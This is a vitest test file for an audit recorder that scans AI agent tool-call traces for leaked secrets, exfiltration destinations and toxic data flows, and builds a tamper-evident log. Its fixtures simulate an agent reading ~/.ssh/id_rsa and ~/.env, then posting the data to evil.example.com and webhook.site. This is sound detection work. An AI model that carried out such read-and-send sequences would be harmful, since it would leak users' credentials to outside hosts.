import { describe, it, expect } from "vitest";
import {
  ingestTrace,
  analyzeEvents,
  recordTrace,
  buildAuditLog,
  serializeLog,
  verifyLog,
  exportArticle12,
} from "../src/mcp-scan/recorder.js";

const FAKE_AWS = "AKIA" + "IOSFODNN7EXAMPLE";

// A flat-attribute OTel span (one common shape).
function flatSpan(tool: string, args: string, result: string): string {
  return JSON.stringify({
    name: "execute_tool",
    timestamp: "2026-06-13T00:00:00Z",
    attributes: {
      "gen_ai.operation.name": "execute_tool",
      "gen_ai.tool.name": tool,
      "gen_ai.tool.call.arguments": args,
      "gen_ai.tool.call.result": result,
    },
  });
}

// An OTLP array-attribute span (the other common shape).
function otlpSpan(tool: string): string {
  return JSON.stringify({
    name: "tool.call",
    attributes: [
      { key: "mcp.method.name", value: { stringValue: "tools/call" } },
      { key: "gen_ai.tool.name", value: { stringValue: tool } },
      { key: "gen_ai.tool.call.arguments", value: { stringValue: "{}" } },
    ],
  });
}

describe("recorder: ingest", () => {
  it("parses flat and OTLP span shapes and keeps only tool-call spans", () => {
    const trace = [
      JSON.stringify({ name: "some_other_span", attributes: {} }),
      flatSpan("read_file", '{"path":"notes.txt"}', "hello"),
      otlpSpan("list_dir"),
    ].join("\n");
    const events = ingestTrace(trace);
    expect(events).toHaveLength(2);
    expect(events[0].toolName).toBe("read_file");
    expect(events[1].toolName).toBe("list_dir");
  });
});

describe("recorder: runtime detection", () => {
  it("flags a secret that appears in a tool RESULT", () => {
    const trace = flatSpan("read_file", '{"path":"~/.env"}', `KEY=${FAKE_AWS}`);
    const findings = analyzeEvents(ingestTrace(trace));
    expect(findings.some((f) => f.category === "secret_in_result")).toBe(true);
  });

  it("flags a suspicious exfiltration sink domain", () => {
    const trace = flatSpan("http_post", '{"url":"https://webhook.site/abc"}', "ok");
    const findings = analyzeEvents(ingestTrace(trace));
    expect(findings.some((f) => f.category === "exfil_domain")).toBe(true);
  });

  it("flags a cross-call toxic flow to an unknown external destination as high", () => {
    const trace = [
      flatSpan("read_file", '{"path":"~/.ssh/id_rsa"}', "PRIVATE KEY DATA"),
      flatSpan("http_post", '{"url":"https://evil.example.com/collect"}', "ok"),
    ].join("\n");
    const toxic = analyzeEvents(ingestTrace(trace)).find((f) => f.category === "toxic_flow");
    expect(toxic).toBeTruthy();
    expect(toxic?.severity).toBe("high");
  });

  it("escalates a toxic flow to a known exfiltration sink to critical", () => {
    const trace = [
      flatSpan("read_file", '{"path":"~/.env"}', "SECRET=x"),
      flatSpan("http_post", '{"url":"https://webhook.site/abc"}', "ok"),
    ].join("\n");
    const toxic = analyzeEvents(ingestTrace(trace)).find((f) => f.category === "toxic_flow");
    expect(toxic?.severity).toBe("critical");
  });

  it("TAINT survives intermediate hops: read, benign transform, then send still flags", () => {
    const trace = [
      flatSpan("read_file", '{"path":"~/.ssh/id_rsa"}', "PRIVATE KEY DATA"),
      flatSpan("summarize", '{"text":"..."}', "summary"),
      flatSpan("format_json", '{"data":"..."}', "{}"),
      flatSpan("http_post", '{"url":"https://webhook.site/x"}', "ok"),
    ].join("\n");
    const toxic = analyzeEvents(ingestTrace(trace)).find((f) => f.category === "toxic_flow");
    expect(toxic).toBeTruthy();
    expect(toxic?.evidence).toMatch(/intermediate call/);
  });

  it("novelty: tainted data to a first-seen destination scores critical", () => {
    const trace = [
      flatSpan("read_file", '{"path":"~/.env"}', "SECRET=x"),
      flatSpan("http_post", '{"url":"https://api.newvendor.com/ingest"}', "ok"),
    ].join("\n");
    // no prior knowledge -> novel -> critical
    const novelFindings = analyzeEvents(ingestTrace(trace), { knownDestinations: new Set() });
    expect(novelFindings.find((f) => f.category === "toxic_flow")?.severity).toBe("critical");
    // destination already known -> high (still flagged, lower severity)
    const knownFindings = analyzeEvents(ingestTrace(trace), {
      knownDestinations: new Set(["api.newvendor.com"]),
    });
    expect(knownFindings.find((f) => f.category === "toxic_flow")?.severity).toBe("high");
  });

  it("does not flag egress to an internal/localhost destination", () => {
    const trace = [
      flatSpan("read_file", '{"path":"~/.env"}', "SECRET=x"),
      flatSpan("http_post", '{"url":"http://localhost:3000/log"}', "ok"),
    ].join("\n");
    const toxic = analyzeEvents(ingestTrace(trace)).find((f) => f.category === "toxic_flow");
    expect(toxic).toBeUndefined();
  });

  it("stays quiet on a benign trace", () => {
    const trace = [
      flatSpan("get_weather", '{"city":"Pune"}', '{"temp":31}'),
      flatSpan("save_note", '{"text":"buy milk"}', '{"id":1}'),
    ].join("\n");
    const findings = analyzeEvents(ingestTrace(trace));
    expect(findings).toHaveLength(0);
  });
});

describe("recorder: tamper-evident audit log", () => {
  const meta = { agentId: "claude-code", agentVersion: "1.0", sessionId: "sess-1" };
  const trace = [
    flatSpan("read_file", '{"path":"~/.env"}', `KEY=${FAKE_AWS}`),
    flatSpan("http_post", '{"url":"https://evil.example.com"}', "ok"),
  ].join("\n");

  it("builds a chained log with genesis and session_close", () => {
    const log = buildAuditLog(recordTrace(trace), meta);
    expect(log[0].action_type).toBe("session_start");
    expect(log[log.length - 1].action_type).toBe("session_close");
    expect(log[0].prev_hash).toBeNull();
    // every AAT mandatory field present on a tool_call record
    const tc = log.find((r) => r.action_type === "tool_call")!;
    for (const k of [
      "record_id",
      "timestamp",
      "agent_id",
      "agent_version",
      "session_id",
      "action_type",
      "action_detail",
      "outcome",
      "trust_level",
      "parent_record_id",
      "prev_hash",
    ]) {
      expect(tc).toHaveProperty(k);
    }
  });

  it("verifies an intact chain and detects tampering", () => {
    const log = buildAuditLog(recordTrace(trace), meta);
    const text = serializeLog(log);
    expect(verifyLog(text).ok).toBe(true);

    // Tamper: edit a record's content without fixing the chain.
    const lines = text.trim().split("\n");
    const rec = JSON.parse(lines[1]);
    rec.action_detail.tool_name = "totally_safe";
    lines[1] = JSON.stringify(rec);
    const tampered = lines.join("\n") + "\n";
    const result = verifyLog(tampered);
    expect(result.ok).toBe(false);
    expect(result.brokenAt).toBeGreaterThan(0);
  });

  it("assigns L0 trust to a tool call with critical findings", () => {
    const log = buildAuditLog(recordTrace(trace), meta);
    expect(log.some((r) => r.trust_level === "L0")).toBe(true);
  });
});

describe("recorder: Article 12 export", () => {
  it("produces an operation-level event log", () => {
    const meta = { agentId: "a", agentVersion: "1", sessionId: "s" };
    const trace = flatSpan("get_weather", "{}", "{}");
    const exp = exportArticle12(recordTrace(trace), meta) as {
      events: unknown[];
      total_tool_calls: number;
    };
    expect(exp.total_tool_calls).toBe(1);
    expect(exp.events).toHaveLength(1);
  });
});
